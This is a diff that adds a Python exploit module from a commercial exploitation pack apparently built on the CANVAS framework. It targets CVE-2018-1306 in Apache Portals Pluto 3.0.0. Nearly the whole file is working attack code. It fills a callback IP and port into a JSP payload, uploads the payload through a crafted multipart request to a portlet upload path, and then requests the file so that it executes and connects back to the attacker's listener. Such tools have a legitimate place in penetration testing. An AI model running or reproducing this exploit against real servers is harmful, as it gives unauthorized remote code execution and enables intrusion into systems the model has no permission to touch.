@@ -1,0 +1,138 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+import sys
+import time
+import os
+import random
+
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+
+# GUI info
+NAME = "Apache Portals Pluto 3.0.0 Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote Code Execution in Apache Portals Pluto 3.0.0 PortletV3AnnotatedDemo"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Apache"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Versions Affected"] = "Pluto 3.0.0"
+DOCUMENTATION["Date public"] = "2018.06.26"
+DOCUMENTATION["References"] = "https://packetstormsecurity.com/files/149366/apacheportalspluto300-exec.txt"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2018-1306"
+DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1306"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = '1.0'
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["All"] ]
+
+NOTES="""
+Start converttomosdef to get a MOSDEF node from the JAVA node.
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ""    
+    self.filename = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_pluto/d2.jsp"    
+    self.protocol = "http"
+    self.port = 8080
+    self.sslport = 8080
+    self.https = 0
+    self.name = NAME
+    return
+
+  def neededListenerTypes(self):
+    return [canvasengine.JAVASERVER]
+	
+  def upload_file(self):               
+    # Open JSP file
+    f = open(self.filename, "r")
+    fdata = f.read()
+    f.close()
+    
+    fdata = fdata.replace("CALLBACK_IP", self.callback.ip)
+    fdata = fdata.replace("CALLBACK_PORT", str(self.callback.port))    
+
+    if self.https == 0:
+        self.protocol = "http"
+    else:
+        self.protocol = "https"
+        self.port = self.sslport
+    
+    ua = spkproxy.UserAgent("", exploit=self)
+
+    # Upload JSP file            
+    s = self.gettcpsock()
+    s.connect((self.host, self.port))    
+    data = '-----------------------------114782935826962\r\nContent-Disposition: form-data; name="color"\r\n\r\n#e0ffe0\r\n-----------------------------114782935826962\r\nContent-Disposition: form-data; name="file"; filename="d2.jsp"\r\nContent-Type: application/octet-stream\r\n\r\n%s\r\n-----------------------------114782935826962--\r\n\r\n'%(fdata)		    	    	    		
+    buff =  "HEAD /pluto/portal/File%20Upload/__pdPortletV3AnnotatedDemo.MultipartPortlet%21-1517407963%7C0;0/__ac0 HTTP/1.1\r\n"    	
+    buff += "Host: " + self.host + ":" + str(self.port) + "\r\n"    	    	
+    buff += "Content-Type: multipart/form-data; boundary=---------------------------114782935826962\r\n"
+    buff += "Content-Length: " + str(len(data)) + "\r\n"
+    buff += "\r\n\r\n"
+    buff += data                    
+    self.websend(s, buff)
+    	
+    time.sleep(5)
+        
+    # Execute uploaded JSP file
+    url = "/PortletV3AnnotatedDemo/temp/d2.jsp"
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    data = ua.GET(mainurl)    
+                		
+    return 1
+
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port))
+    self.sslport = int(self.argsDict.get("sslport", self.sslport))
+    self.https = int(self.argsDict.get("https", self.https))     
+
+  def run(self):
+    self.getargs()
+    self.setInfo("%s attacking %s"%(NAME,self.host))
+ 
+    ret = self.upload_file()
+    
+    self.setInfo("%s attacking %s - done"%(NAME, self.host))
+    
+    return ret
+
+  def usage(self):
+    print "Usage: " + sys.argv[0] + " -t target -p port -O https:[0|1]"
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
